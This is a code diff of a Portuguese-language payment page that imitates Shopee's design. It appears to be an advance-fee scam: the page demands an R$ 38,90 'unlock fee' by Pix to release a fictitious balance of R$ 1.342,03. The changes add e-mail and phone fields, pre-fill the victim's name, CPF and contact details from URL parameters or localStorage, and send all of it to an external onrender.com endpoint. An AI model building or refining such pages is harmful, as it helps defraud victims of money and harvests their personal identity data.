@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Finalizar Pagamento</title>
 <style>
-    /* --- CSS FIEL AO DESIGN SHOPEE --- */
+    /* --- CSS FIEL AO DESIGN --- */
     * {
         margin: 0;
         padding: 0;
@@ -13,21 +13,19 @@
         font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
     }
 
-    /* Fundo da Página */
     .background {
         background: linear-gradient(135deg, #ee4d2d, #ff6a4d);
         display: flex;
         justify-content: center;
         align-items: center;
-        min-height: 100vh; /* Ocupa tela toda */
+        min-height: 100vh;
         padding: 20px;
         width: 100%;
     }
 
-    /* Cartão Branco Central */
     .checkout-card {
         background: #fff;
-        border-radius: 8px; /* Shopee usa bordas levemente arredondadas */
+        border-radius: 8px;
         padding: 30px 25px;
         width: 100%;
         max-width: 420px;
@@ -36,7 +34,6 @@
         position: relative;
     }
 
-    /* Logo Shopee */
     .logo {
         display: flex;
         align-items: center;
@@ -97,7 +94,7 @@
     }
     .progress-fill {
         height: 100%;
-        width: 50%; /* Metade preenchido */
+        width: 50%;
         background: #ee4d2d;
         border-radius: 10px;
         animation: loadingBar 1s ease-in-out;
@@ -107,7 +104,7 @@
         to { width: 50%; }
     }
 
-    /* CAMPOS DE INPUT (Adicionados para o Pix funcionar) */
+    /* CAMPOS DE INPUT */
     .input-group {
         margin-bottom: 15px;
         text-align: left;
@@ -146,7 +143,7 @@
         justify-content: space-between;
         font-size: 14px;
         color: #555;
-        margin-bottom: 5px;
+        margin-bottom: 8px;
     }
     .resumo-row strong {
         color: #333;
@@ -194,7 +191,6 @@
         gap: 5px;
     }
 
-    /* ÁREA DO QR CODE (Escondida inicialmente) */
     #pix_area {
         display: none;
         text-align: center;
@@ -247,7 +243,7 @@
             </div>
 
             <div class="progress-item">
-                <span>Pagamento</span>
+                <span>Antecipação de saque</span>
                 <span class="status pending">Pendente</span>
             </div>
         </div>
@@ -258,6 +254,14 @@
                 <input type="text" id="nome_cliente" class="input-shopee" placeholder="Digite seu nome">
             </div>
             <div class="input-group">
+                <label>E-mail</label>
+                <input type="email" id="email_cliente" class="input-shopee" placeholder="seu@email.com">
+            </div>
+            <div class="input-group">
+                <label>Celular</label>
+                <input type="tel" id="telefone_cliente" class="input-shopee" placeholder="(00) 00000-0000">
+            </div>
+            <div class="input-group">
                 <label>CPF (Apenas números)</label>
                 <input type="tel" id="cpf_cliente" class="input-shopee" placeholder="000.000.000-00" maxlength="14">
             </div>
@@ -265,9 +269,15 @@
 
         <div class="resumo" id="resumo_compra">
             <div class="resumo-row">
-                <span>Produto</span>
+                <span>&nbsp;</span>
                 <strong>Taxa de Desbloqueio</strong>
             </div>
+            
+            <div class="resumo-row">
+                <span>Saldo a liberar:</span>
+                <strong>R$ 1.342,03 <span style="color: #1f9c6b;">+ 27,90 + 38,90 = R$ 1.408,83</span></strong>
+            </div>
+
             <div class="resumo-row" style="margin-top:10px; padding-top:10px; border-top:1px solid #eee;">
                 <span>Total a pagar</span>
                 <strong class="total">R$ 27,90</strong>
@@ -299,7 +309,28 @@
 </div>
 
 <script>
-    // --- LÓGICA DO PIX (Backend Render + Frontend) ---
+    // --- FUNÇÃO PARA PEGAR PARÂMETROS DA URL OU LOCALSTORAGE ---
+    function capturarDados() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+
+        // Mapeamento
+        const dados = {
+            nome: urlParams.get('nome') || storedData.nome || "",
+            email: urlParams.get('email') || storedData.email || "",
+            phone: urlParams.get('phone') || urlParams.get('telefone') || storedData.telefone || "",
+            cpf: urlParams.get('cpf') || storedData.cpf || storedData.documento || ""
+        };
+
+        if(dados.nome) document.getElementById('nome_cliente').value = dados.nome;
+        if(dados.email) document.getElementById('email_cliente').value = dados.email;
+        if(dados.phone) document.getElementById('telefone_cliente').value = dados.phone;
+        if(dados.cpf) document.getElementById('cpf_cliente').value = dados.cpf;
+    }
+
+    // Executa ao carregar a página
+    window.onload = capturarDados;
+
     const btn = document.getElementById('btn_finalizar');
     const pixArea = document.getElementById('pix_area');
     const formInputs = document.getElementById('form_inputs');
@@ -313,49 +344,49 @@
     });
 
     btn.addEventListener('click', function() {
-        // 1. Pega dados
         const nome = document.getElementById('nome_cliente').value.trim();
-        const cpf = document.getElementById('cpf_cliente').value.replace(/\D/g, ''); // Remove pontos/traços
-        const valor = "27.90"; // Valor fixo
+        const email = document.getElementById('email_cliente').value.trim();
+        const phone = document.getElementById('telefone_cliente').value.trim();
+        const cpf = document.getElementById('cpf_cliente').value.replace(/\D/g, ''); 
+        const valor = "38.90"; 
 
-        // 2. Valida
-        if(nome.length < 3 || cpf.length < 11) {
-            alert("Por favor, preencha seu Nome e CPF corretamente.");
+        if(nome.length < 3 || cpf.length < 11 || email.length < 5) {
+            alert("Por favor, preencha seus dados corretamente.");
             return;
         }
 
-        // 3. UI de Carregamento
         const textoOriginal = btn.innerText;
         btn.innerText = "PROCESSANDO...";
         btn.disabled = true;
 
-        // 4. Chama API
+        // Chamada API enviando todos os dados
         fetch("https://checkout-pix-profissional.onrender.com/pix", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name: nome, cpf: cpf, valor: valor })
+            body: JSON.stringify({ 
+                name: nome, 
+                cpf: cpf, 
+                email: email, 
+                phone: phone, 
+                valor: valor 
+            })
         })
         .then(res => res.json())
         .then(data => {
             if(data.success) {
-                // SUCESSO!
-                // Esconde formulário e botão, mostra Pix
                 formInputs.style.display = 'none';
                 resumo.style.display = 'none';
                 barra.style.display = 'none';
-                btn.style.display = 'none'; // Some o botão laranja
+                btn.style.display = 'none'; 
                 
-                // Preenche dados do Pix
-                document.getElementById('img_qrcode').src = data.encodedImage;
+                document.getElementById('img_qrcode').src = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
                 document.getElementById('txt_copia_cola').innerText = data.payload;
                 
-                // Mostra área do Pix
                 pixArea.style.display = 'block';
                 document.getElementById('titulo_card').innerText = "Pagamento Pendente";
                 document.getElementById('titulo_card').style.color = "#ee4d2d";
                 document.getElementById('desc_card').innerText = "Realize o pagamento para liberar o saldo instantaneamente.";
 
-                // Salva o código para copiar
                 window.codigoPix = data.payload;
             } else {
                 alert("Erro ao gerar Pix: " + (data.message || "Tente novamente"));
